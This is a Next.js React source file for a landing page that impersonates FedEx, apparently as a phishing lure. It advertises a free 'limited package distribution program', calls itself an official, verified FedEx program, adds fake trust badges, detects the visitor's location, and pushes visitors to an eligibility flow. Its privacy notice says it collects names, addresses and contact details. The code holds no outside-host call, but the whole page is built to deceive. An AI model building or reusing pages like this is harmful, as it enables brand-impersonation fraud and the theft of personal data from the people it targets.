'use client'
import { useState } from 'react'
import { useRouter } from 'next/navigation'
import { Shield, Zap, Package } from 'lucide-react'
import Header from './components/Header'
import LocationDetector from './components/LocationDetector'

interface LocationData {
  state: string
  city: string
  country: string
  eligible: boolean
}

export default function HomePage() {
  const router = useRouter()
  const [isNavigating, setIsNavigating] = useState(false)

  const handleLocationDetected = (loc: LocationData) => {
    if (typeof window !== 'undefined') {
      sessionStorage.setItem('detectedLocation', JSON.stringify(loc))
    }
  }

  const handleClaimPackage = () => {
    setIsNavigating(true)
    router.push('/eligibility')
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-white to-fedex-light">
      <Header />

      <main className="max-w-6xl mx-auto px-4 sm:px-6">
        {/* Hero Section */}
        <section className="py-12 sm:py-16 lg:py-20">
          <div className="grid lg:grid-cols-2 gap-12 items-center">
            {/* Text Content */}
            <div className="animate-fade-in" style={{ animationDelay: '0.1s' }}>
              <div className="inline-flex items-center gap-2 bg-fedex-purple/10 text-fedex-purple px-3 py-1.5 rounded-full text-sm font-body font-semibold mb-6">
                <div className="w-2 h-2 bg-fedex-success rounded-full animate-pulse" />
                Limited Distribution Active
              </div>
              <h1 className="font-display font-bold text-4xl sm:text-5xl lg:text-6xl text-fedex-dark leading-tight mb-6">
                Your Package
                <span className="text-fedex-purple block">Awaits You</span>
              </h1>
              <p className="font-body text-lg text-gray-600 mb-8 leading-relaxed">
                FedEx is running a limited package distribution program. Verify your eligibility and claim your package today. Completely free, no hidden fees.
              </p>
              <div className="flex flex-col sm:flex-row gap-3">
                <button
                  onClick={handleClaimPackage}
                  disabled={isNavigating}
                  className="btn-primary text-lg py-4 px-10 flex items-center justify-center gap-2 disabled:opacity-70"
                >
                  {isNavigating ? (
                    <>
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                      Loading...
                    </>
                  ) : (
                    <>
                      <Package className="w-5 h-5" />
                      Claim Your Package
                    </>
                  )}
                </button>
              </div>
            </div>

            {/* Hero Graphic */}
            <div className="flex justify-center animate-fade-in" style={{ animationDelay: '0.3s' }}>
              <div className="relative">
                <div className="w-64 h-64 sm:w-80 sm:h-80 bg-fedex-purple/10 rounded-full flex items-center justify-center animate-bounce-gentle">
                  <div className="w-48 h-48 sm:w-60 sm:h-60 bg-fedex-purple/20 rounded-full flex items-center justify-center">
                    <svg viewBox="0 0 200 200" className="w-40 h-40 sm:w-52 sm:h-52" fill="none" xmlns="http://www.w3.org/2000/svg">
                      {/* Package box */}
                      <rect x="40" y="80" width="120" height="90" rx="4" fill="#4D148C" opacity="0.9"/>
                      <rect x="40" y="80" width="120" height="30" rx="4" fill="#731FDD"/>
                      <line x1="100" y1="80" x2="100" y2="170" stroke="#F47B20" strokeWidth="3"/>
                      <line x1="40" y1="95" x2="160" y2="95" stroke="#F47B20" strokeWidth="3"/>
                      {/* Ribbon */}
                      <rect x="85" y="60" width="30" height="25" rx="4" fill="#F47B20"/>
                      <path d="M85 60 Q100 50 115 60" stroke="#F47B20" strokeWidth="3" fill="none"/>
                      {/* Stars */}
                      <circle cx="55" cy="60" r="4" fill="#F47B20" opacity="0.6"/>
                      <circle cx="145" cy="55" r="3" fill="#4D148C" opacity="0.5"/>
                      <circle cx="165" cy="75" r="5" fill="#731FDD" opacity="0.4"/>
                    </svg>
                  </div>
                </div>
                <div className="absolute -top-4 -right-4 bg-fedex-success text-white text-xs font-bold px-3 py-1.5 rounded-full shadow-lg">
                  ✅ FREE
                </div>
                <div className="absolute -bottom-4 -left-4 bg-fedex-orange text-white text-xs font-bold px-3 py-1.5 rounded-full shadow-lg">
                  📦 Verified
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* Trust Section */}
        <section className="py-12 animate-fade-in" style={{ animationDelay: '0.5s' }}>
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-6">
            {[
              {
                icon: <Shield className="w-8 h-8 text-fedex-purple" />,
                title: 'FedEx Verified',
                desc: 'Official FedEx distribution program with guaranteed delivery',
              },
              {
                icon: <div className="w-8 h-8 text-fedex-purple text-2xl">🔒</div>,
                title: 'Secure & Private',
                desc: 'Your personal data is encrypted and never shared with third parties',
              },
              {
                icon: <Zap className="w-8 h-8 text-fedex-purple" />,
                title: 'Real-time Tracking',
                desc: 'Track your package status live from distribution to delivery',
              },
            ].map((item, i) => (
              <div key={i} className="bg-fedex-light rounded-2xl p-6 text-center">
                <div className="flex justify-center mb-3">{item.icon}</div>
                <h3 className="font-display font-bold text-fedex-dark mb-2">{item.title}</h3>
                <p className="font-body text-sm text-gray-500">{item.desc}</p>
              </div>
            ))}
          </div>
        </section>

        {/* Location Detection Banner */}
        <section className="py-6 animate-fade-in" style={{ animationDelay: '0.7s' }}>
          <LocationDetector onLocationDetected={handleLocationDetected} />
        </section>

        {/* Legal Disclaimer */}
        <section className="py-6 mb-12 animate-fade-in" style={{ animationDelay: '0.9s' }}>
          <div className="bg-gray-50 border border-gray-200 rounded-xl p-5">
            <p className="font-body text-xs text-gray-500 leading-relaxed text-center">
              🔒 <strong>Privacy Notice:</strong> We collect your name, address, and contact information solely for package distribution verification. Your data is used ONLY for package delivery purposes and is automatically deleted after 24 hours. We comply with GDPR and applicable privacy regulations.
            </p>
          </div>
        </section>
      </main>
    </div>
  )
}
